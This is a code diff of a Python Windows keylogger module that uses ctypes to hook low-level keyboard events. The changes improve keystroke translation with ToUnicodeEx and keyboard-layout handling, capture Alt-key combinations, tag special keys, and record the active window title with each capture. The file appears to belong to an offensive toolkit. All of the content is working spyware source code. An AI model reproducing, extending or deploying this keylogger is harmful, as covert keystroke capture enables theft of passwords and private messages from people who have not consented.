@@ -12,6 +12,7 @@
 # 
 # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
+#coding: utf-8
 import sys
 from ctypes import *
 from ctypes.wintypes import MSG, DWORD, HINSTANCE, HHOOK, WPARAM, LPARAM, BOOL, LPCWSTR, HMODULE
@@ -21,57 +22,66 @@ import datetime
 import platform
 import os
 
+# Base windows types
+BYTE    = c_ubyte
+WORD    = c_ushort
+DWORD   = c_ulong
+WCHAR   = c_wchar
 LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
-HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, POINTER(c_void_p))
-user32=windll.user32
+WPARAM  = c_uint
+LPARAM  = c_long
+HANDLE  = c_void_p
+HHOOK   = HANDLE
+HKL     = HANDLE
+
+HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
+user32 = windll.user32
 kernel32 = windll.kernel32
 
 #some windows function defines :
-SetWindowsHookEx = user32.SetWindowsHookExA
-SetWindowsHookEx.restype = HHOOK
-SetWindowsHookEx.argtypes = [c_int, HOOKPROC, HINSTANCE, DWORD]
-CallNextHookEx = user32.CallNextHookEx
-CallNextHookEx.restype = LRESULT
-CallNextHookEx.argtypes = [HHOOK, c_int, WPARAM, POINTER(c_void_p)]
-UnhookWindowsHookEx = user32.UnhookWindowsHookEx
-UnhookWindowsHookEx.restype = BOOL
-UnhookWindowsHookEx.argtypes = [HHOOK]
-GetModuleHandleW=kernel32.GetModuleHandleW
+GetModuleHandleW = kernel32.GetModuleHandleW
 GetModuleHandleW.restype = HMODULE
 GetModuleHandleW.argtypes = [LPCWSTR]
 
-WH_KEYBOARD_LL=13
-WM_KEYDOWN=0x0100
+# Base constans
+# https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
+WM_KEYDOWN      = 0x0100
+WM_SYSKEYDOWN   = 0x0104
+WH_KEYBOARD_LL  = 13
+VK_TAB          = 0x09 # TAB key
+VK_CAPITAL      = 0x14 # CAPITAL key
+VK_SHIFT        = 0x10 # SHIFT key
+VK_CONTROL      = 0x11 # CTRL key
+VK_MENU         = 0x12 # ALT key
+VK_LMENU        = 0xA4 # ALT key
+VK_RMENU        = 0xA5 # ALT+GR key
+VK_RETURN       = 0x0D # ENTER key
+VK_ESCAPE       = 0x1B
 
-psapi=windll.psapi
-current_window=None
-paste=None
+# Base Win API
+SetWindowsHookEx    = user32.SetWindowsHookExW
+UnhookWindowsHookEx = user32.UnhookWindowsHookEx
+CallNextHookEx      = user32.CallNextHookEx
+GetMessage          = user32.GetMessageW
+GetKeyboardState    = user32.GetKeyboardState
+GetKeyboardLayout   = user32.GetKeyboardLayout
+ToUnicodeEx         = user32.ToUnicodeEx
 
-keyCodes={
-    0x08 : "[BKSP]",
-    0x09 : "[TAB]",
-    0x0D : "[ENTER]",
-    0x10 : "[SHIFT]",
-    0x11 : "[CTRL]",
-    0x12 : "[ALT]",
-    0x13 : "[PAUSE]",
-    0x14 : "[CAPS_LOCK]",
-    0x1B : "[ESCAPE]",
-    0x20 : " ",
-    0x25 : "[LEFT]",
-    0x26 : "[UP]",
-    0x27 : "[RIGHT]",
-    0x28 : "[DOWN]",
-    0x2C : "[PRINT_SCREEN]",
-    0x2E : "[DEL]",
-    0x90 : "[NUM_LOCK]",
-    0xA0 : "[LSHIFT]",
-    0xA1 : "[RSHIFT]",
-    0xA2 : "[LCTRL]",
-    0xA3 : "[RCTRL]",
-    0xA4 : "[LMENU]",
-    0xA5 : "[RMENU]",
-}
+# Macros
+LOWORD = lambda x: x & 0xffff
+
+# Base structures
+class KBDLLHOOKSTRUCT(Structure):
+    _fields_ = [
+        ('vkCode',      DWORD),
+        ('scanCode',    DWORD),
+        ('flags',       DWORD),
+        ('time',        DWORD),
+        ('dwExtraInfo', POINTER(c_ulong))
+    ]
+
+# Function prototypes
+LOWLEVELKEYBOARDPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
 
 def keylogger_start():
     if hasattr(sys, 'KEYLOGGER_THREAD'):
@@ -96,6 +106,8 @@ def keylogger_stop():
 class KeyLogger(threading.Thread):
     def __init__(self, *args, **kwargs):
         threading.Thread.__init__(self, *args, **kwargs)
+        self.hllDll = WinDLL("User32.dll")
+
         self.hooked=None
         self.daemon=True
         if not hasattr(sys, 'KEYLOGGER_BUFFER'):
@@ -125,19 +137,6 @@ class KeyLogger(threading.Thread):
         sys.KEYLOGGER_BUFFER=""
         return res
 
-    def convert_key_code(self, code):
-        #https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
-        code=c_long(code).value
-        if code >=0x41 and code <=0x5a: # letters
-            return chr(code)
-        elif code>=0x30 and code <=0x39: # numbers
-            return str(code-0x30)
-        elif code>=0x60 and code <=0x69: # keypad numbers
-            return str(code-0x60)
-        elif code in keyCodes:
-            return keyCodes[code]
-        return "[%02x]"%code
-
     def install_hook(self):
         self.pointer = HOOKPROC(self.hook_proc)
         modhwd=GetModuleHandleW(None)
@@ -153,9 +152,46 @@ class KeyLogger(threading.Thread):
         self.hooked = None
 
     def hook_proc(self, nCode, wParam, lParam):
-        if wParam != WM_KEYDOWN:
+        
+        # The keylogger callback
+        if LOWORD(wParam) != WM_KEYDOWN and LOWORD(wParam) != WM_SYSKEYDOWN:
             return CallNextHookEx(self.hooked, nCode, wParam, lParam)
-        hooked_key = self.convert_key_code(lParam[0])
+
+        keyState = (BYTE * 256)()
+        buff = (WCHAR * 256)()
+        kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)
+        hooked_key = ""
+        specialKey = ""
+        # index of the keystate : http://wiki.cheatengine.org/index.php?title=Virtual-Key_Code
+        # ESCAPE
+        if self.hllDll.GetKeyState(VK_ESCAPE) & 0x8000:
+            specialKey = '[ESCAPE]'
+        
+        # SHIFT
+        if self.hllDll.GetKeyState(VK_SHIFT) & 0x8000: 
+            keyState[16] = 0x80;
+        
+        # CTRL
+        if self.hllDll.GetKeyState(VK_CONTROL) & 0x8000: 
+            keyState[17] = 0x80;
+
+        # ALT
+        if self.hllDll.GetKeyState(VK_MENU) & 0x8000:
+            keyState[18] = 0x80;
+
+        if kbdllhookstruct.vkCode == VK_TAB:
+            specialKey = '[TAB]'
+        elif kbdllhookstruct.vkCode == VK_RETURN:
+            specialKey = '[RETURN]'
+
+        # if hooked_key:
+        hKl = GetKeyboardLayout(0)
+        GetKeyboardState(byref(keyState))
+        ToUnicodeEx(kbdllhookstruct.vkCode, kbdllhookstruct.scanCode, byref(keyState), byref(buff), 256, 0, hKl)
+        hooked_key = buff.value.encode('utf8')
+
+        if specialKey:
+            hooked_key = specialKey
 
         exe, win_title = "unknown", "unknown"
         try:
